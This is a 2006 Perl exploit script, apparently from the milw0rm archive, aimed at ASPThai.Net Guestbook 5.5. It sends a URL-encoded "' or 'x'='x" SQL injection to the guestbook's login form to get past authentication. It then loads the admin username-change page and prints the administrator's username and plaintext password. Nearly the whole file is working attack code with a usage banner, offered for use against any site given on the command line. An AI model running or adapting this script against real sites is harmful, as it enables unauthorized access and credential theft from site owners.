#!/usr/bin/perl
# SQL Injection Exploit for ASPThai.Net Guestbook <= 5.5  
#(And possible higher could not find a site to test it on)
# This exploit shows the username of the administrator and the password In plain text
# Bug Found by muderskillz Coded by Zodiac
# Shouts to cijfer,uid0,|n|ex,ph4tel,z3r0,lethal, Felosi,seven,Spic and anyone else I forgot.
# http://exploitercode.com/ http://www.g00ns.net 
#irc.g00ns.net #g00ns  email = zodiac@g00ns.net
#(c) 2006

use LWP::UserAgent;
use HTTP::Cookies;

$Server = $ARGV[0];

if($Server =~m/http/g)
{
$Server=~ 'http://$Server';
print 
}
else {
  print $error;
}

if(!$Server) {usage();exit() ;}

head();

print "\r\nGrabbing Username And Password\r\n\n";

#Login's and stores a cookie to view admin panel later


 $xpl = LWP::UserAgent->new() or die;
 $cookie_jar = HTTP::Cookies->new();

 $xpl->agent('g00ns');
 $xpl->cookie_jar($cookie_jar);

 $res = $xpl->post(
 $Server.'check_user.asp',
 Content => [ 

	'txtUserName' => '\' or \'%67%30%30%6e%73\'=\'%67%30%30%6e%73', 
	'txtUserPass' => '\' or \'%67%30%30%6e%73\'=\'%67%30%30%6e%73',
	'Submit' => '-= Login =-',
 ],
 );

# Create a request
my $req = HTTP::Request->new(GET => 

$Server.'change_admin_username.asp'

);

$req->header('Referer', $Server.'admin_menu.asp');

my $res = $xpl->request($req);

$info= $res->content;

if($info =~ m/Unauthorised\sAccess|The\spage\scannot\sbe\sfound/) 
{ 
 die "Error Connecting...\r\n"; 
}

#Check the outcome of the response

$info=~m/(value=\")(\n+|\w+|\W+)/g;
$User = $2;
$info=~m/(value=\")(\n+|\w+|\W+)/g;
$Pass= $2;

print "UserName:$User\r\nPassword:$Pass\r\n";

sub head()
 {
 print "\n=======================================================================\r\n";
 print "* ASPThai.Net Guestbook version 5.5 SQL Injection by www.g00ns.net *\r\n";   
 print "=======================================================================\r\n";
 }
sub usage()
 {
 head();
 print " Usage: Thaisql.pl <Site>  \r\n\n";
 print " <Site> - Full path to Guestbook e.g. http://www.site.com/guestbook/ \r\n";
 print "=======================================================================\r\n";
 print "   -=Coded by Zodiac, Bug Found by MurderSkillz=-\r\n";
 print "www.exploitercode.com www.g00ns.net irc.g00ns.net #g00ns\r\n";
 print "=======================================================================\r\n";

# milw0rm.com [2006-02-06]
